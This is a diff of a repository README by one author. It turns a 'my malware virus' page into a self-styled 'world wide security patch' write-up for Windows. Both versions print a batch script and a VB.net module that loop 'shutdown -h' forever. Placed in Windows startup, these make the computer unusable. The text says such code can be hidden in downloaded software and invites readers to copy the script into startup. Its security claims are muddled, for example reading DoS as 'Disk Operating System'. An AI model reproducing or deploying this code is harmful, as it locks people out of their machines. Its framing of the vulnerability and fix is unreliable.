@@ -1,63 +1,50 @@
-# MyVirus
-My malware virus 
-
-Failure of Malware detection Techniques in front
-Wadï Mami Malware
-Date of publication : 10/08/2020
+My World Wide Security Patch for Windows 2000/XP/7/8/10/11 and all Kind of Windows Servers 32bits/64bits.
 Author : Wadï Mami
-e-mail : didipostman77@gmail.com
+Publication Date : 12/07/2021
+Email : wmami@steg.com.tn / didipostman77@gmail.com 
 
-Abstract :
 
-Many malware analysis and detection techniques are studied and compared. But none of them is able to detect My Malware. A Malware that works fine for Windows 2000/XP/7/8/10 which makes it severe but not very dangereous as it causes a Dos a denial of service Well a denial of all services as your Windows Pc or Laptop is intact but you can’t make use of it any more till a specialist intervention.
+Introduction
+Since 2015 I have contacted Microsoft for a security vulnerability which is a Dos (Disk Operating System) command. For this reason I have written .bat file which exploits this command. But MSRC (Microsoft Security Response Center) consider it as a malware and I must report it like that. I was not agree but I accepted and I reported it as a malware but they did nothing. 
+Please visit https://github.com/didipostman/MyVirus
+But let me explain to you the real problem.
 
-Wadï Mami Malware : Here I share with you myvirus.bat file virus code it can be converted to .exe or .com myvirus.bat code :
+The problem
+If shutdown command is executed in Windows startup you can not use your Windows PC/Laptop anymore till an expert intervention by booting with a bootable CD/DVD or a system Flash disk and then exploring the startup Windows for a suspicious file that exploit shutdown command and delete it.
+Think if the following .bat file is copied in the start up Windows by a Worm 
+Please visit:
+https://stackoverflow.com/questions/35587412/how-this-batch-worm-works
+here I give only concept Don't use this code whith malicious intention!
 
------------------------------------------------- 
-
-echo off 
-
+---------------------------------------------------------------
+echo off
 rem clean screen
-
-cls 
-
+cls
 rem definition return point
-
-:loop 
-
-rem execute shutdown -h 
-
-shutdown -h 
-
-rem return to :loop 
-
-goto loop 
-
---------------------------------------------------
-
-If you excuted it is your own risks don’t blame me if you excuted it is your own risks don’t blame me. That kind of code can be hidden in software you use or you download and install. It works fine for windows 2000/XP/7/8/10.
-
-Moreover here a VB.net equivalent code to the .bat DOS Shell above A VB.net Source Code as an example It works fine for Windows XP/7/8/10. 
-
+:loop
+rem execute shutdown -h
+shutdown -h
+rem return to :loop
+goto loop
+That kind of code can be hidden in software you use or you download and install in Windows Startup. It works fine for windows 2000/XP/7/8/10/11 etc.
+Moreover here a VB.net equivalent code to the .bat DOS Shell above A VB.net Source Code as an example It works fine for Windows XP/7/8/10/11.
+It is a VB.net Module that can generate .exe file
 --------------------------------------------------------- 
-
 Imports System.Runtime.InteropServices 
-
 Module Module1 
-
 Sub Main()
-
 Dim process As Process = process.Start("cmd","/C shutdown -h")
-
 Main() 
-
 End Sub
-
---------------------------------------------------
-
 As you can see all high generation Languages can exploit this DOS command shutdown –h which leads to a DoS a denial of service well a denial of all the services as your Windows Pc is intact but you can’t make use of it.
 
 Conclusion :
-
 What is the solution to avoid this kind of exploit of this DOS command shutdown.
 Shall Microsoft Depricated it or shall keep it assuming security measurements in using it.
+The world wide security patch for Windows2000/XP/7/8/10/11 against shutdown vulnerability is to disable shutdown execution on Windows startup. To figure out the problem try to copy myVirus.bat in Windows startup and execute it.
+
+https://github.com/didipostman/MyVirus
+
+Shutdown: Allow system to be shut down without having to log on
+
+ https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shutdown-allow-system-to-be-shut-down-without-having-to-log-on
